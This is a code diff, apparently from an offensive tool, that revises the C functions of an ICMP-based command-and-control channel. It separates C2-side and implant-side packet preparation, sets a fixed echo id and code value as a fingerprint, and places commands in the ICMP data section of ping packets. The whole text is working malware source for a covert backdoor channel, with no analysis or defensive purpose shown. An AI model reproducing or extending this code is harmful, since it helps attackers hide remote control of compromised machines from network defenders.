@@ -80,7 +80,7 @@ ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
 // check if we got an actual connection from our implant
 /* TODO: dynamic id */
 int check_magic_byte(struct icmphdr *icmp) {
-    if (icmp->type == 8 && icmp->un.echo.id == RAND_ID) {
+    if (icmp->code == 8 && icmp->un.echo.id == RAND_ID) {
         return 1;
     }
     return 0;
@@ -104,17 +104,30 @@ unsigned char *parse_data_section(unsigned char *packet) {
     return data;
 }
 
-// prep'ing the ICMP headers & setting up the checksum
-void prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
+// prep'ing the ICMP headers & setting up the checksum for c2
+void c2_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
+    icmp->type = ICMP_ECHOREPLY;
+    icmp->code = ICMP_ECHO;
+    icmp->un.echo.id = RAND_ID;
     icmp->checksum = 0;
     icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
-    icmp->type = 8;
-    icmp->un.echo.id = RAND_ID;
 }
 
-// append the command to the data section of the packet
-void append_to_data_section(struct icmphdr *icmp, unsigned char *input) {
-    memcpy((unsigned char *) icmp + sizeof(struct icmphdr), input, strlen((char *) input));
+// prep'ing the ICMP headers & setting up the checksum for implant
+void implant_prep_icmp_headers(struct icmphdr *icmp, size_t input_size) {
+    icmp->type = ICMP_ECHO;
+    icmp->code = ICMP_ECHO;
+    icmp->un.echo.id = RAND_ID;
+    icmp->checksum = 0;
+    icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + input_size);
+}
 
-    prep_icmp_headers(icmp, strlen((char *) input));
+// append the command to the data section of the packet for c2
+void c2_append_to_data_section(struct icmphdr *icmp, unsigned char *input) {
+    memcpy((unsigned char *) icmp + sizeof(struct icmphdr), input, strlen((char *) input));
+}
+
+// append the command to the data section of the packet for implant
+void implant_append_to_data_section(struct icmphdr *icmp, unsigned char *input) {
+    memcpy((unsigned char *) icmp + sizeof(struct icmphdr), input, strlen((char *) input));
 }
